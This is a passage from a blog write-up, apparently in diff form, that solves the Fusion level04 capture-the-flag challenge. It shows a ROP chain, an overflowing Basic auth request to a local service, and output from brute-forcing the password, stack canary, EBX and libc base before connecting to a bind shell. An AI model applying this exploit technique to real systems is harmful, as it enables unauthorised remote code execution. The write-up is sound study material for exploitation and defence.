+        p += pack(&quot;&lt;I&quot;, off + 0x001789e3) # @ .data + 35
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x000238df) # pop eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x001789c0) # @ .data
+        p += pack(&quot;&lt;I&quot;, off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x001789e7) # @ .data + 39
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x000238df) # pop eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x001789d0) # @ .data + 16
+        p += pack(&quot;&lt;I&quot;, off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x001789eb) # @ .data + 43
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x000238df) # pop eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x001789d9) # @ .data + 25
+        p += pack(&quot;&lt;I&quot;, off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x001789ef) # @ .data + 47
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x000328e0) # xor eax,eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x00018f4e) # pop ebx ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x001789c0) # @ .data
+        p += pack(&quot;&lt;I&quot;, off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x001789e3) # @ .data + 35
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x00001a9e) # pop edx ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x001789ef) # @ .data + 47
+        p += pack(&quot;&lt;I&quot;, off + 0x000328e0) # xor eax,eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x00026722) # inc eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x00026722) # inc eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x00026722) # inc eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x00026722) # inc eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x00026722) # inc eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x00026722) # inc eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x00026722) # inc eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x00026722) # inc eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x00026722) # inc eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x00026722) # inc eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x00026722) # inc eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x0002dd35) # int 0x80
+	credentials = base64.b64encode(&quot;stack6:{0}&quot;.format(passwd + &quot;A&quot;*canary_offset + canary + &quot;B&quot;*12 + ebx + &quot;E&quot;*12 + p))
+	s = socket(AF_INET, SOCK_STREAM)
+	s.connect((&quot;localhost&quot;, 20004))
+	request = &quot;GET / HTTP/1.0\r\n&quot;
+	request += &quot;Authorization: Basic {0}\r\n&quot;.format(credentials)
+	request += &quot;\n&quot;
+	s.send(request)
+	s.close()
+
+raw_input(&quot;[+] Attach GDB to server process and Press Enter to continue...&quot;)
+credentials = base64.b64encode(&quot;stack6:{0}&quot;.format(passwd + &quot;A&quot;*canary_offset + canary + &quot;B&quot;*12 + ebx + &quot;E&quot;*12 + &quot;DDDD&quot;))
+s = socket(AF_INET, SOCK_STREAM)
+s.connect((&quot;localhost&quot;, 20004))
+request = &quot;GET / HTTP/1.0\r\n&quot;
+request += &quot;Authorization: Basic {0}\r\n&quot;.format(credentials)
+request += &quot;\n&quot;
+s.send(request)
+response = s.recv(1024)
+s.close()
+</code></pre>
+
+<p>Now, lets try it:</p>
+
+<pre><code class="language-lang-bash">fusion@fusion:~$ python fusion04.py
+[+] Bruteforcing password ...
+[+] Eureka 4D4fqSa0fM477TS5
+[+] Validating password ...
+[+] Server response HTTP/1.0 200 Ok
+[+] Searching Canary offset. Starting with 2000 ...
+[+] Server response *** stack smashing detected ***: /opt/fusion/bin/level04 terminated
+[+] Canary offset: 2026
+[+] Bruteforcing Canary ...
+[+] Found canary byte: 0x0
+[+] Found canary byte: 0x52
+[+] Found canary byte: 0xb9
+[+] Found canary byte: 0x57
+[+] Canary found: 0052b957
+[+] Bruteforcing EBX ...
+[+] Found EBX byte: 0x18
+[+] Found EBX byte: 0xa1
+[+] Found EBX byte: 0x78
+[+] Found EBX byte: 0xb7
+[+] EBX found: 18a178b7
+[+] Binary loaded at address: 0xb7786000L
+[+] Bruteforcing libc base address
+</code></pre>
+
+<p>After a couple of minutes the shell will be waiting for us:</p>
+
+<pre><code class="language-lang-bash">fusion@fusion:~$ sudo netstat -natp | grep LISTEN
+tcp        0      0 0.0.0.0:20002           0.0.0.0:*               LISTEN      1017/level02
+tcp        0      0 0.0.0.0:20003           0.0.0.0:*               LISTEN      1005/level03
+tcp        0      0 0.0.0.0:20004           0.0.0.0:*               LISTEN      29795/level04
+tcp        0      0 0.0.0.0:20005           0.0.0.0:*               LISTEN      963/level05
+tcp        0      0 0.0.0.0:20006           0.0.0.0:*               LISTEN      870/level06
+tcp        0      0 0.0.0.0:20008           0.0.0.0:*               LISTEN      837/level08
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      691/sshd
+tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      788/nc
+tcp        0      0 0.0.0.0:20000           0.0.0.0:*               LISTEN      1047/level00
+tcp        0      0 0.0.0.0:20001           0.0.0.0:*               LISTEN      1031/level01
+tcp6       0      0 :::22                   :::*                    LISTEN      691/sshd
+fusion@fusion:~$ nc localhost 4444
+id
+uid=20004 gid=20004 groups=20004
+</code></pre>
+
+<p>Thanks for reading!</p>
+</article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="/tags/ctf"><span class="tag">CTF</span></a></li>
+        
+          <li><a href="/tags/fusion"><span class="tag">Fusion</span></a></li>
+        
+          <li><a href="/tags/exploit"><span class="tag">Exploit</span></a></li>
+        
+          <li><a href="/tags/level04"><span class="tag">Level04</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        This post was published <strong>2123</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+      </p>
+    </footer>
+    
+      
+    
+  </section>
+  
+<footer class="site-footer">
+  <p>© 2017-2019 &lt;/pwntester&gt;</p>
+  <p>Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank" rel="noopener">Nuo</a>.</p>
+  
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/smooth-scroll@15.0.0/dist/smooth-scroll.min.js"></script>
+
+
+
+<script async src="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video.min.js"></script>
+
+
+
+
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    },
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+
+
+<script src="/scripts/index.min.js"></script>
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('\/service-worker.js').then(function() {
+      console.log('[ServiceWorker] Registered');
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
